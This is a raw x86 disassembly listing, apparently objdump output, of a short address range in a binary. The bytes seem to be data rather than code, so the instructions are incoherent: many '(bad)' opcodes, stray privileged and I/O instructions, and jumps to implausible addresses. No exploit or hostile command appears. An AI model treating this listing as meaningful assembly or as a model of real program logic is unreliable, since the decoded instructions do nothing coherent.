  44d691:	add    al,0x25
  44d693:	and    ebx,DWORD PTR [edi-0x6]
  44d696:	adc    esp,ebp
  44d698:	push   0x78231d0f
  44d69d:	std    
  44d69e:	push   cs
  44d69f:	push   ebp
  44d6a0:	jmp    FWORD PTR [ecx]
  44d6a2:	pop    ds
  44d6a3:	das    
  44d6a4:	jo     0x44d683
  44d6a6:	dec    ebp
  44d6a7:	push   ss
  44d6a8:	arpl   ax,cx
  44d6aa:	cli    
  44d6ab:	and    cl,BYTE PTR [eax-0x38]
  44d6ae:	std    
  44d6af:	pop    ss
  44d6b0:	add    BYTE PTR [ecx],ah
  44d6b2:	adc    ebp,esp
  44d6b4:	ins    DWORD PTR es:[edi],dx
	...
  44d6d1:	add    BYTE PTR [eax],al
  44d6d3:	add    ch,cl
  44d6d5:	bnd jae 0x44d720
  44d6d8:	aad    0xef
  44d6da:	addr16 inc esp
  44d6dc:	aad    0xd6
  44d6de:	pop    eax
  44d6df:	add    BYTE PTR [ebx],dh
  44d6e1:	add    eax,DWORD PTR [ecx+0x73]
  44d6e4:	push   ebx
  44d6e5:	add    eax,0xdcbf6c6c
  44d6ea:	data16 ja 0x44d677
  44d6ed:	dec    edi
  44d6ee:	popa   
  44d6ef:	fs add ch,BYTE PTR fs:[eax+eax*1-0x59]
  44d6f5:	(bad)  [ebp+0x76]
  44d6f8:	xchg   ecx,eax
  44d6f9:	lock jae 0x44d74f
  44d6fc:	lea    eax,[esi]
  44d6fe:	push   esp
  44d6ff:	outs   dx,DWORD PTR ds:[esi]
  44d700:	ja     0x44d6d8
  44d702:	imul   ebp,DWORD PTR [ecx-0x46],0xd0694b04
  44d709:	xor    al,0x0
  44d70b:	add    ch,dh
  44d70d:	aas    
  44d70e:	dec    esi
  44d70f:	inc    ecx
  44d710:	hlt    
  44d711:	cmp    ch,BYTE PTR [ebx]
  44d713:	xor    bl,BYTE PTR [edx]
  44d715:	loopne 0x44d782
  44d717:	ins    BYTE PTR es:[edi],dx
  44d718:	xor    al,0x2
  44d71a:	dec    ebp
  44d71b:	add    BYTE PTR [ebx+eiz*8],al
  44d71e:	jae    0x44d788
  44d720:	repz push es
  44d722:	je     0x44d768
  44d724:	neg    dl
  44d726:	ins    DWORD PTR es:[edi],dx
  44d727:	gs cmp dl,ch
  44d72a:	bound  edx,QWORD PTR fs:[ecx]
  44d72d:	repnz dec esi
  44d72f:	add    BYTE PTR [edi+0x1],ch
  44d732:	push   eax
  44d733:	popa   
  44d734:	lock (bad) [ecx+0x65]
	...
  44d754:	add    BYTE PTR [eax],al
  44d756:	sbb    ebx,ebx
  44d758:	ins    DWORD PTR es:[edi],dx
  44d759:	gs xor bl,cl
  44d75c:	imul   esp,DWORD PTR [ebp-0x9],0xffffffeb
  44d760:	pop    esp
  44d761:	arpl   WORD PTR [ebx-0x78fee6ff],dx
  44d767:	aad    0x69
  44d769:	inc    ebx
  44d76a:	or     eax,0x444a2cbc
  44d76f:	outs   dx,BYTE PTR ds:[esi]
  44d770:	cld    
  44d771:	sbb    eax,0x6e288a0c
  44d776:	dec    esi
  44d777:	mov    ah,0x2c
  44d779:	dec    edx
  44d77a:	cmp    dl,BYTE PTR [edi-0x78f28704]
  44d780:	sbb    eax,0x29682574
  44d785:	imul   eax,DWORD PTR [ecx],0xec704f7c
  44d78b:	jns    0x44d7a6
  44d78d:	ins    DWORD PTR es:[edi],dx
  44d78e:	loop   0x44d726
  44d790:	cld    
  44d791:	gs or  al,0x84
  44d794:	cs ins BYTE PTR es:[edi],dx
  44d796:	shl    BYTE PTR [ecx+ebx*1+0x6d],0xee
  44d79b:	ja     0x44d7c9
  44d79d:	arpl   sp,cx
  44d79f:	xchg   esi,eax
  44d7a0:	cld    
  44d7a1:	sbb    DWORD PTR [edx+ebp*8],ecx
  44d7a4:	aaa    
  44d7a5:	outs   dx,BYTE PTR ds:[esi]
  44d7a6:	into   
  44d7a7:	xor    esi,DWORD PTR [edx+ecx*2]
  44d7aa:	aam    0xd7
  44d7ac:	add    esi,DWORD PTR [eax]
  44d7ae:	or     eax,0xa57422e7
  44d7b3:	xlat   BYTE PTR ds:[ebx]
  44d7b4:	daa    
  44d7b5:	fs iret 
  44d7b7:	aaa    
  44d7b8:	and    DWORD PTR [ebp+0x0],esp
	...
  44d7d7:	add    BYTE PTR [esi-0x5a92dcc6],bl
  44d7dd:	or     eax,0xe70d8304
  44d7e2:	and    dh,BYTE PTR [ebp+esi*2-0x17]
  44d7e6:	imul   esi,DWORD PTR es:[edx+0x5],0x27
  44d7eb:	ds ins BYTE PTR es:[edi],dx
  44d7ed:	cli    
  44d7ee:	sbb    BYTE PTR [ebp+0x61],ch
  44d7f1:	clc    
  44d7f2:	xor    BYTE PTR [eax+0x42],ch
  44d7f5:	xchg   edi,eax
  44d7f6:	cld    
  44d7f7:	mov    al,0xd
  44d7f9:	or     bh,BYTE PTR [esp+eax*2]
  44d7fc:	jo     0x44d7a1
  44d7fe:	daa    
  44d7ff:	je     0x44d869
  44d801:	add    BYTE PTR [ecx-0x3bd4c6dc],bh
  44d807:	pop    edx
  44d808:	or     eax,0x48049600
  44d80d:	cmp    BYTE PTR [ebx-0x44e4ded8],ah
  44d813:	sub    BYTE PTR [eax+0x1b],dl
  44d816:	rcr    BYTE PTR [edx+0xd],0x0
  44d81a:	scas   al,BYTE PTR es:[edi]
  44d81b:	add    edi,DWORD PTR ds:0x461bb31f
  44d821:	pop    ds
  44d822:	fwait
  44d823:	es cmc 
  44d825:	push   eax
  44d826:	xchg   edi,eax
  44d827:	sub    al,ah
  44d829:	dec    esp
  44d82a:	out    0x3,eax
  44d82c:	int3   
  44d82d:	push   DWORD PTR [esi-0x56e806dc]
  44d833:	sbb    al,0xf7
  44d835:	sbb    esp,DWORD PTR [ebx+ebp*1+0x36811ad9]
	...
  44d858:	add    BYTE PTR [eax],al
  44d85a:	repnz adc al,0x79
  44d85d:	pop    edx
  44d85e:	or     eax,0xdd043000
  44d863:	push   ds
  44d864:	push   ebx
  44d865:	sbb    al,0xcf
  44d867:	push   ss
  44d868:	inc    ecx
  44d869:	sub    bh,cl
  44d86b:	push   ss
  44d86c:	cmp    ebp,DWORD PTR [ecx]
  44d86e:	(bad)  
  44d86f:	push   ds
  44d870:	push   esp
  44d871:	sub    DWORD PTR [edi+edi*8+0x2bd004dd],edi
  44d878:	xor    eax,0x192fa647
  44d87d:	inc    ebp
  44d87e:	or     eax,0x7c051700
  44d883:	sub    cl,BYTE PTR [ecx]
  44d885:	aaa    
  44d886:	jge    0x44d8b6
  44d888:	add    BYTE PTR [edx],ah
  44d88a:	sbb    DWORD PTR [edx],0x1640432
  44d890:	cli    
  44d891:	cmp    DWORD PTR [edi+0x2f],esi
  44d894:	div    DWORD PTR ds:0xfd00126a
  44d89a:	and    al,0xe3
  44d89c:	(bad)  
  44d89d:	stc    
  44d89e:	push   cs
  44d89f:	push   eax
  44d8a0:	pop    edi
  44d8a1:	frstor [esi]
  44d8a3:	cmp    ebp,DWORD PTR [ebp-0x4c]
  44d8a6:	pop    eax
  44d8a7:	xor    al,0x51
  44d8a9:	jmp    0xb94525bc
  44d8ae:	jmp    0xe3f540de
  44d8b3:	cmp    esp,DWORD PTR [edi-0x45]
  44d8b6:	cmc    
  44d8b7:	inc    esp
  44d8b8:	je     0x44d880
  44d8ba:	loopne 0x44d8e6
  44d8bc:	push   ecx
  44d8bd:	jmp    0x44d8c2
	...
  44d8da:	add    BYTE PTR [eax],al
  44d8dc:	push   cs
  44d8dd:	sar    bh,cl
  44d8df:	mov    eax,0xa8682c31
  44d8e4:	sub    bl,BYTE PTR [ebx+eax*2]
  44d8e7:	xchg   ecx,eax
  44d8e8:	inc    edx
  44d8e9:	pop    ds
  44d8ea:	push   0xffffff9a
  44d8ec:	adc    DWORD PTR [ecx],ebx
  44d8ee:	push   0xffffff9e
  44d8f0:	push   cs
  44d8f1:	out    dx,al
  44d8f2:	(bad)  
  44d8f3:	cdq    
  44d8f4:	sbb    dl,BYTE PTR [edx]
  44d8f6:	dec    esi
  44d8f7:	stos   BYTE PTR es:[edi],al
  44d8f8:	not    BYTE PTR [ecx]
  44d8fa:	aas    
  44d8fb:	jmp    0x3a43e40e
  44d900:	add    eax,0xf94c3d12
  44d905:	cmp    dl,BYTE PTR [ecx-0x17]
  44d908:	push   cs
  44d909:	or     al,0xff
  44d90b:	cmp    ebp,esi
  44d90d:	adc    DWORD PTR ds:0x50e351,edi
  44d913:	out    dx,al
  44d914:	sysexit 
  44d916:	je     0x44d953
  44d918:	rcl    BYTE PTR [edi],1
  44d91a:	outs   dx,BYTE PTR ds:[esi]
  44d91b:	sub    BYTE PTR [ecx],cl
  44d91d:	jne    0x44d91e
  44d91f:	cmp    BYTE PTR [esi],ch
  44d921:	sub    al,0x68
  44d923:	cmp    ah,BYTE PTR [eax]
  44d925:	sbb    esi,DWORD PTR [eax+0x3b]
  44d928:	sub    al,0x19
  44d92a:	je     0x44d962
  44d92c:	or     DWORD PTR [ecx-0x20fb0001],ecx
  44d932:	jae    0x44d99c
  44d934:	stc    
  44d935:	(bad)  [eax+0x75]
  44d938:	adc    ebp,eax
  44d93a:	pop    esp
  44d93b:	push   ebx
  44d93c:	aam    0xdd
  44d93e:	pop    edx
  44d93f:	add    BYTE PTR gs:[eax],al
	...
  44d95e:	out    0x47,eax
  44d960:	add    BYTE PTR [eax],al
  44d962:	xchg   esi,esp
  44d964:	dec    ebx
  44d965:	push   edi
  44d966:	gs dec esi
  44d968:	inc    ecx
  44d969:	cs enter 0x6c02,0x0
  44d96e:	idiv   ebx
  44d970:	dec    edx
  44d971:	dec    eax
  44d972:	imul   ebx,ecx,0x73
  44d975:	inc    esi
  44d976:	rol    DWORD PTR [edx],cl
  44d978:	fs gs push esi
  44d97b:	dec    esi
  44d97c:	pop    ecx
  44d97d:	je     0x44d91b
  44d97f:	inc    edi
  44d980:	add    BYTE PTR [eax],al
  44d982:	push   0xfffffffe
  44d984:	cmp    ch,BYTE PTR [edi-0x6f]
  44d987:	add    DWORD PTR [ecx+0x6e],ebx
  44d98a:	mov    dl,ah
  44d98c:	pusha  
  44d98d:	outs   dx,BYTE PTR ds:[esi]
  44d98e:	cdq    
  44d98f:	dec    edx
  44d990:	addr16 inc ecx
  44d992:	out    0xd7,al
  44d994:	ins    DWORD PTR es:[edi],dx
  44d995:	push   edi
  44d996:	fs (bad) 
  44d998:	sbb    DWORD PTR [ecx],eax
  44d99a:	ja     0x44d9a2
  44d99c:	pop    ebp
  44d99d:	ins    BYTE PTR es:[edi],dx
  44d99e:	loopne 0x44d9da
  44d9a0:	js     0x44da07
  44d9a2:	xlat   BYTE PTR ds:[ebx]
  44d9a3:	jmp    0x484a:0xfbfb6573
  44d9aa:	jmp    0x267825ee
  44d9af:	mov    al,ds:0xfbd06c5c
  44d9b4:	adc    eax,0x73daeb00
  44d9b9:	push   ebp
  44d9ba:	xlat   BYTE PTR ds:[ebx]
  44d9bb:	fisubr DWORD PTR [ecx+0x4e]
  44d9be:	adc    eax,0x455d01
	...
  44d9df:	add    BYTE PTR [edi+eax*2],ch
  44d9e2:	add    BYTE PTR [eax],al
  44d9e4:	or     eax,0x785d20e6
  44d9e9:	add    eax,0xf33b2df3
  44d9ee:	pop    ds
  44d9ef:	ins    BYTE PTR es:[edi],dx
  44d9f0:	or     eax,0x5f3cfd19
  44d9f5:	hlt    
  44d9f6:	sbb    al,0x74
  44d9f8:	push   0x306e3806
  44d9fd:	mov    eax,0x6f334919
  44da02:	inc    edi
  44da03:	ins    BYTE PTR es:[edi],dx
  44da04:	sub    dh,BYTE PTR [ebp-0x60f293e3]
  44da0a:	cld    
  44da0b:	cmp    al,0x59
  44da0d:	xchg   BYTE PTR ds:0x1f654b44,dh
  44da13:	imul   edi,DWORD PTR [esi],0x63
  44da16:	xor    ah,BYTE PTR [edi+0x23]
  44da19:	mov    edx,0x660c76fc
  44da1e:	xor    BYTE PTR [esi-0xc],ch
  44da21:	jo     0x44da4a
  44da23:	inc    edx
  44da24:	(bad)  
  44da25:	jns    0x44da40
  44da27:	inc    ecx
  44da28:	fcomp  DWORD PTR [edi+0x40]
  44da2b:	cs or  eax,0xf23cfc8f
  44da31:	mov    bl,BYTE PTR ds:0x215be66d
  44da37:	imul   ecx,ebx,0x24
  44da3a:	and    ah,BYTE PTR [ebx+0xd]
  44da3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44da3e:	cld    
  44da3f:	cmp    al,0xb2
  44da41:	aad    0x2d
  44da43:	arpl   WORD PTR [eax],ax
	...
  44da61:	add    BYTE PTR [edx+eax*2+0x45a34727],ch
  44da68:	cmp    BYTE PTR [edi-0x45],bl
  44da6b:	xor    eax,0x330d0027
  44da70:	add    al,0x3d
  44da72:	stos   BYTE PTR es:[edi],al
  44da73:	add    ebx,DWORD PTR [edx]
  44da75:	addr16 mov ds:0x383f,eax
  44da79:	ins    BYTE PTR es:[di],dx
  44da7b:	add    BYTE PTR [ebx],dl
  44da7d:	sbb    eax,0x3e71b7b
  44da82:	dec    ebp
  44da83:	add    BYTE PTR [esi],ah
  44da85:	pop    ds
  44da86:	dec    edx
  44da87:	adc    al,BYTE PTR [eax]
  44da89:	cmp    BYTE PTR [edx+0x1f],dh
  44da8c:	adc    ebx,DWORD PTR ds:0x29161b5b
  44da92:	cmp    BYTE PTR [ebx],ch
  44da94:	cmc    
  44da95:	sbb    al,0x59
  44da97:	daa    
  44da98:	out    0x3,eax
  44da9a:	add    al,0x0
  44da9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44da9d:	push   ds
  44da9e:	dec    edx
  44da9f:	adc    dl,al
  44daa1:	aaa    
  44daa2:	xor    bl,BYTE PTR [edi]
  44daa4:	ret    
  44daa5:	sbb    al,0x3b
  44daa7:	sbb    esp,DWORD PTR [ebx+ebp*1+0x3c6000d]
  44daae:	loopne 0x44dac0
  44dab0:	xchg   esi,eax
  44dab1:	sub    BYTE PTR [ecx],ah
  44dab3:	push   eax
  44dab4:	mov    ch,0x1e
  44dab6:	adc    eax,0xea1fa527
  44dabb:	adc    DWORD PTR [esi-0x760006d8],ecx
  44dac1:	pop    ds
  44dac2:	out    dx,al
  44dac3:	in     al,dx
  44dac4:	aam    0xdd
	...
  44dae2:	add    BYTE PTR [eax],al
  44dae4:	out    dx,al
  44dae5:	adc    edi,DWORD PTR [ebx+0x3]
  44dae8:	xor    al,0x0
  44daea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44daeb:	xor    esi,ebp
  44daed:	push   ds
  44daee:	jae    0x44db18
  44daf0:	sbb    BYTE PTR [ecx],dl
  44daf2:	test   BYTE PTR [ebx],dh
  44daf4:	mov    dl,0x2b
  44daf6:	and    BYTE PTR [ecx],0xb9
  44daf9:	sbb    ah,BYTE PTR ds:0x4812b91d
  44daff:	xor    al,0xd
  44db01:	add    cl,cl
  44db03:	add    ecx,ecx
  44db05:	sbb    bh,BYTE PTR [ebx]
  44db07:	sub    DWORD PTR [ecx-0x54ddcde6],esp
  44db0d:	sbb    al,BYTE PTR [esi+0x38]
  44db10:	or     eax,0x9a30000
  44db15:	aas    
  44db16:	arpl   WORD PTR ds:0x103e4755,si
  44db1c:	inc    ebp
  44db1d:	sub    eax,0xdd0ed400
  44db22:	ins    DWORD PTR es:[edi],dx
  44db23:	or     al,0x28
  44db25:	adc    al,0x63
  44db27:	and    eax,0xc4cde28
  44db2c:	cs adc al,0x67
  44db2f:	push   cs
  44db30:	sti    
  44db31:	(bad)  
  44db32:	(bad)  
  44db33:	std    
  44db34:	or     al,0x4d
  44db36:	arpl   bp,di
  44db38:	cmc    
  44db39:	cmp    al,0x74
  44db3b:	mov    dh,0xec
  44db3d:	and    eax,0x2ca63
  44db42:	add    BYTE PTR [edx],ah
  44db44:	or     DWORD PTR [ecx+0x63],eax
  44db47:	aad    0x0
	...
  44db65:	add    BYTE PTR [edx+0x23],dl
  44db68:	jb     0x44db3a
  44db6a:	out    dx,eax
  44db6b:	and    bh,BYTE PTR ds:0x2cdec8
  44db71:	ror    BYTE PTR [esi+ecx*2],0x63
  44db75:	mov    edx,0x8c6e2942
  44db7a:	retf   0xffdc
  44db7d:	cwde   
  44db7e:	or     al,0x4d
  44db80:	pop    edi
  44db81:	lahf   
  44db82:	and    eax,0xee93d44
  44db87:	sar    bh,1
  44db89:	test   eax,0x755f231c
  44db8e:	and    eax,0x1e8468dd
  44db93:	aas    
  44db94:	je     0x44db16
  44db96:	in     al,dx
  44db97:	sub    esp,DWORD PTR [ebx+0x2d]
  44db9a:	int3   
  44db9b:	(bad)  
  44db9c:	dec    DWORD PTR [eax+0x5d634d0f]
  44dba2:	fbld   TBYTE PTR [edx]
  44dba4:	pop    ebp
  44dba5:	push   ebp
  44dba6:	mov    edi,0x34006a20
  44dbab:	add    ebp,DWORD PTR [ebp+0x1]
  44dbae:	repz out 0x60,eax
  44dbb1:	inc    esi
  44dbb2:	enter  0x6ad6,0x68
  44dbb6:	hlt    
  44dbb7:	add    bl,bl
  44dbb9:	add    BYTE PTR [eax],dh
  44dbbb:	out    0x6b,eax
  44dbbd:	gs and bh,ah
  44dbc0:	inc    ebx
  44dbc1:	inc    ebx
  44dbc2:	in     al,0x2
  44dbc4:	mov    eax,ds:0x73e72702
  44dbc9:	push   esi
	...
  44dbe6:	add    BYTE PTR [eax],al
  44dbe8:	std    
  44dbe9:	out    0x6e,al
  44dbeb:	jo     0x44dbf8
  44dbed:	shl    BYTE PTR [ebx+0x4f],cl
  44dbf0:	(bad)  
  44dbf1:	jecxz  0x44dc2f
  44dbf3:	js     0x44dba9
  44dbf5:	add    ch,BYTE PTR [edx]
  44dbf7:	add    BYTE PTR [edi-0x30],dh
  44dbfa:	pop    esp
  44dbfb:	popa   
  44dbfc:	loopne 0x44dbe3
  44dbfe:	inc    ebx
  44dbff:	inc    ebx
  44dc00:	jae    0x44dc04
  44dc02:	or     eax,DWORD PTR [eax]
  44dc04:	jbe    0x44dbff
  44dc06:	jae    0x44dc4a
  44dc08:	mov    eax,0x73ffffd6
  44dc0d:	inc    esi
  44dc0e:	inc    ecx
  44dc0f:	xor    edx,DWORD PTR [esi-0x3793a344]
  44dc15:	add    cl,BYTE PTR [eax+0x5cd09200]
  44dc1b:	gs test esi,esp
  44dc1e:	arpl   WORD PTR [edx-0x73],si
  44dc21:	cld    
  44dc22:	pop    ebp
  44dc23:	outs   dx,DWORD PTR ds:[esi]
  44dc24:	je     0x44dc28
  44dc26:	add    DWORD PTR [eax],0x6173e593
  44dc2c:	nop
  44dc2d:	out    0x69,al
  44dc2f:	imul   ecx,DWORD PTR [edx+0x6a0066e4],0xf5534f02
  44dc39:	inc    edx
  44dc3a:	fs fs (bad) 
  44dc3d:	out    0x6a,al
  44dc3f:	jae    0x44dc4e
  44dc41:	fstp   QWORD PTR [edx]
  44dc43:	dec    ebp
  44dc44:	mov    eax,ds:0xaa6a153a
  44dc49:	out    0x3,eax
  44dc4b:	and    BYTE PTR [eax],al
	...
  44dc69:	add    BYTE PTR ds:0xce3f4ef6,cl
  44dc6f:	fisub  DWORD PTR [eax]
  44dc71:	pop    edi
  44dc72:	add    DWORD PTR [ecx+eax*2+0x72],0x37f568
  44dc7a:	or     eax,0x5e50fcb1
  44dc7f:	call   0x9db54ec4
  44dc84:	xor    BYTE PTR [ebp+0x68],cl
  44dc87:	repz and BYTE PTR [ebp+0x61],bl
  44dc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44dc8c:	cld    
  44dc8d:	and    BYTE PTR ds:0x503f4efe,cl
  44dc93:	popf   
  44dc94:	xor    DWORD PTR [ebx+0x53],ebp
  44dc97:	int3   
  44dc98:	xor    BYTE PTR [ecx+0x2a],dh
  44dc9b:	mov    ecx,0xcc3b4317
  44dca0:	sbb    dh,BYTE PTR [esi+ebx*1-0x59]
  44dca4:	cld    
  44dca5:	xor    DWORD PTR ds:0x443f4f7e,ecx
  44dcab:	into   
  44dcac:	pop    ds
  44dcad:	je     0x44dcd0
  44dcaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44dcb0:	cld    
  44dcb1:	adc    al,0xd
  44dcb3:	jbe    0x44dd04
  44dcb5:	aas    
  44dcb6:	into   
  44dcb7:	jb     0x44dcd4
  44dcb9:	ins    DWORD PTR es:[edi],dx
  44dcba:	lock arpl WORD PTR [edx],si
  44dcbd:	arpl   bx,sp
  44dcbf:	jp     0x44dcbd
  44dcc1:	inc    esi
  44dcc2:	or     eax,0xbe3f4f56
  44dcc7:	mov    ebx,DWORD PTR [edx]
  44dcc9:	fs or  eax,0x50fc63
	...
  44dceb:	add    BYTE PTR [esi-0x519cb199],bh
  44dcf1:	adc    al,0xfd
  44dcf3:	push   eax
  44dcf4:	fdivp  st(7),st
  44dcf6:	adc    al,0x4b
  44dcf8:	call   0xa164e5ce
  44dcfd:	sub    esp,edi
  44dcff:	add    ecx,DWORD PTR [edx]
  44dd01:	add    BYTE PTR [esi],ah
  44dd03:	and    DWORD PTR [ebx-0x56ded4ed],esi
  44dd09:	and    dh,BYTE PTR [ebx]
  44dd0b:	and    eax,edx
  44dd0d:	and    dh,BYTE PTR ds:0x40267230
  44dd13:	daa    
  44dd14:	bound  edx,QWORD PTR [esp+ecx*1]
  44dd17:	inc    edx
  44dd18:	imul   ebp,DWORD PTR ds:0x2d79570c,0x15
  44dd1f:	and    DWORD PTR ds:0x20043000,ecx
  44dd25:	and    esi,ebp
  44dd27:	das    
  44dd28:	inc    esp
  44dd29:	adc    BYTE PTR [edx+ebx*1],al
  44dd2c:	inc    eax
  44dd2d:	pop    ss
  44dd2e:	imul   BYTE PTR [edi]
  44dd30:	sub    edx,DWORD PTR cs:[esi]
  44dd33:	xor    BYTE PTR [edx+edx*1],dh
  44dd36:	int3   
  44dd37:	push   edx
  44dd38:	or     eax,0xf003f500
  44dd3d:	and    dl,ch
  44dd3f:	das    
  44dd40:	call   0x2e7b9770
  44dd45:	xor    DWORD PTR [ebx-0x18dcd4e6],edi
  44dd4b:	add    edi,esp
  44dd4d:	(bad)  
  44dd4e:	xchg   esi,eax
  44dd4f:	inc    ecx
	...
  44dd6c:	add    BYTE PTR [eax],al
  44dd6e:	in     eax,0x46
  44dd70:	mov    esp,0x9b11f433
  44dd75:	inc    esi
  44dd76:	out    dx,al
  44dd77:	adc    DWORD PTR [ebx-0x6ad306aa],edx
  44dd7d:	and    BYTE PTR ds:0x2003bb00,cl
  44dd83:	and    esi,DWORD PTR [ebp+0x2f]
  44dd86:	into   
  44dd87:	sub    eax,0x23101874
  44dd8c:	add    BYTE PTR [ebx-0x6],bh
  44dd8f:	and    al,0x62
  44dd91:	sub    bl,0x3c
  44dd94:	je     0x44dde2
  44dd96:	add    al,BYTE PTR [ebp+0x6a]
  44dd99:	cmp    bh,ch
  44dd9b:	outs   dx,BYTE PTR es:[esi]
  44dd9d:	dec    esp
  44dd9e:	adc    ecx,esp
  44dda0:	jmp    FWORD PTR [ecx]
  44dda2:	in     al,dx
  44dda3:	sub    eax,0xfdc2d74
  44dda8:	ins    BYTE PTR es:[edi],dx
  44dda9:	push   eax
  44ddaa:	jmp    0x6e1f:0x524c743c
  44ddb1:	xor    eax,0xa671e20
  44ddb6:	xor    BYTE PTR [ebx+eiz*2],dl
  44ddb9:	sub    dl,BYTE PTR [esi]
  44ddbb:	es je  0x44ddca
  44ddbe:	cmp    DWORD PTR [eax+eax*1],edx
  44ddc1:	test   DWORD PTR [ecx],0x4c214230
  44ddc7:	sbb    BYTE PTR [eax+0xe],dh
  44ddca:	sbb    edx,DWORD PTR [edi*1+0x4d14030c]
  44ddd1:	cmc    
	...
  44ddee:	add    BYTE PTR [eax],al
  44ddf0:	daa    
  44ddf1:	sub    ah,BYTE PTR [ebx-0x54]
  44ddf4:	out    0xff,al
  44ddf6:	inc    DWORD PTR [ecx+0xe]
  44ddf9:	(bad)  [ebp-0x30]
  44ddfc:	ficom  WORD PTR [ebx]
  44ddfe:	push   ebx
  44ddff:	mov    edi,0xbd6929de
  44de04:	in     eax,dx
  44de05:	cmp    al,0x74
  44de07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44de08:	jmp    0xf2e3d20
  44de0d:	fisttp QWORD PTR [ebp-0x70]
  44de10:	fidiv  WORD PTR [ebx]
  44de12:	sub    eax,0x6c1f54db
  44de17:	lea    ecx,[esi]
  44de19:	sub    eax,0x1404a000
  44de1e:	arpl   WORD PTR [ebx+0x741f04],bx
  44de24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44de25:	aad    0x58
  44de27:	arpl   WORD PTR [edi+0x30],di
  44de2a:	push   0x6c
  44de2c:	jne    0x44de2d
  44de2e:	push   eax
  44de2f:	add    BYTE PTR [ebx+ebp*8+0x73],ch
  44de33:	jo     0x44de2a
  44de35:	jmp    0x6665:0xd6ad725c
  44de3c:	sar    DWORD PTR [esi],cl
  44de3e:	add    BYTE PTR [eax],al
  44de40:	lds    eax,FWORD PTR [ebx]
  44de42:	inc    ecx
  44de43:	outs   dx,BYTE PTR ds:[esi]
  44de44:	fdivr  st,st(2)
  44de46:	imul   ebp,DWORD PTR [esi-0x37],0x526f3acf
  44de4d:	neg    BYTE PTR [ebx+eiz*2+0x38]
  44de51:	aas    
	...
  44de72:	cmp    eax,DWORD PTR [eax+ecx*2]
  44de75:	je     0x44de8f
  44de77:	aam    0x46
  44de79:	jo     0x44de94
  44de7b:	test   BYTE PTR [ecx+0x65],0x5
  44de7f:	jmp    0x44dedd
  44de81:	jae    0x44de5b
  44de83:	cmp    eax,0x3f60000
  44de88:	dec    eax
  44de89:	je     0x44de53
  44de8b:	into   
  44de8c:	cmp    BYTE PTR [eax+ecx*1+0x32],ah
  44de90:	pop    ebp
  44de91:	jno    0x44de6c
  44de93:	stc    
  44de94:	push   0x74
  44de96:	jl     0x44de91
  44de98:	pop    eax
  44de99:	fs (bad) 
  44de9c:	push   0x41
  44de9e:	mov    ah,0xfe
  44dea0:	push   edx
  44dea1:	add    BYTE PTR [edx+ebp*8+0x73],bl
  44dea5:	jo     0x44df1e
  44dea7:	stc    
  44dea8:	gs cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  44deab:	stc    
  44deac:	push   0x73d34975
  44deb1:	inc    ecx
  44deb2:	dec    BYTE PTR fs:[esi+0x73f8bd00]
  44deb9:	gs or  eax,0xd9631677
  44debf:	jns    0x44deed
  44dec1:	arpl   bx,bp
  44dec3:	addr16 cld 
  44dec5:	fs or  eax,0xb0741650
  44decb:	push   ss
  44decc:	pop    ss
  44decd:	arpl   WORD PTR [ecx-0x4196ef9b],di
  44ded3:	dec    ebx
  44ded4:	cmp    al,0x5f
	...
  44def2:	add    BYTE PTR [eax],al
  44def4:	mov    ds:0xd631844,eax
  44def9:	aad    0x3
  44defb:	dec    eax
  44defc:	cdq    
  44defd:	xor    al,0x34
  44deff:	dec    ebp
  44df00:	mov    al,0x32
  44df02:	and    BYTE PTR [esi-0x58],cl
  44df05:	xlat   BYTE PTR ds:[ebx]
  44df06:	sub    BYTE PTR [ebx+0x7e],ah
  44df09:	fstp   TBYTE PTR [eax]
  44df0b:	js     0x44df59
  44df0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44df0e:	cld    
  44df0f:	pop    edx
  44df10:	or     eax,0x7d742fcf
  44df15:	(bad)  
  44df16:	sbb    BYTE PTR [edx+0x71],ch
  44df19:	aad    0x18
  44df1b:	outs   dx,DWORD PTR ds:[esi]
  44df1c:	pop    eax
  44df1d:	add    al,0x33
  44df1f:	je     0x44df71
  44df21:	dec    DWORD PTR [esi+0x0]
  44df24:	or     eax,0x3b46fcd6
  44df29:	fwait
  44df2a:	sbb    DWORD PTR [esi+0x33],ebp
  44df2d:	add    al,0x30
  44df2f:	dec    ebp
  44df30:	xor    BYTE PTR [ebx-0x4cd38bad],bh
  44df36:	sub    DWORD PTR [ebp+0x4e],ebp
  44df39:	enter  0x6c10,0x2f
  44df3d:	enter  0x6523,0x4c
  44df41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44df42:	cld    
  44df43:	xchg   esp,eax
  44df44:	or     eax,0xf0741650
  44df49:	push   esp
  44df4a:	push   ss
  44df4b:	arpl   cx,di
  44df4d:	ja     0x44df78
  44df4f:	arpl   di,di
  44df51:	call   FWORD PTR [edi-0x77ec2dc1]
  44df57:	inc    edx
	...
  44df74:	add    BYTE PTR [eax],al
  44df76:	fistp  WORD PTR [esi]
  44df78:	adc    BYTE PTR [edi],0xc2
  44df7b:	sbb    eax,0xd1e7b
  44df80:	inc    edi
  44df81:	add    ecx,edx
  44df83:	sub    DWORD PTR [ebx+0x1e],esi
  44df86:	mov    ebx,0xd32f8c29
  44df8b:	and    cl,BYTE PTR [eax+0x5326cf1f]
  44df91:	and    esi,ecx
  44df93:	pop    ss
  44df94:	sub    BYTE PTR [esp+eax*4],al
  44df97:	add    BYTE PTR [eax],ah
  44df99:	push   ss
  44df9a:	cdq    
  44df9b:	and    dl,BYTE PTR [ebp+0x16]
  44df9e:	scas   al,BYTE PTR es:[edi]
  44df9f:	adc    edx,DWORD PTR ds:0x2123b221
  44dfa5:	sbb    eax,0x3e72379
  44dfaa:	mov    cl,0xff
  44dfac:	pop    ds
  44dfad:	push   ss
  44dfae:	and    DWORD PTR [ebx],0x146e1615
  44dfb4:	and    DWORD PTR ss:[ecx+0x49],esp
  44dfb8:	pop    ss
  44dfb9:	xor    BYTE PTR [edx+0x29],ch
  44dfbc:	stc    
  44dfbd:	inc    esp
  44dfbe:	or     eax,0x45042100
  44dfc3:	adc    al,0xf3
  44dfc5:	xor    ebx,DWORD PTR [eax+0x23]
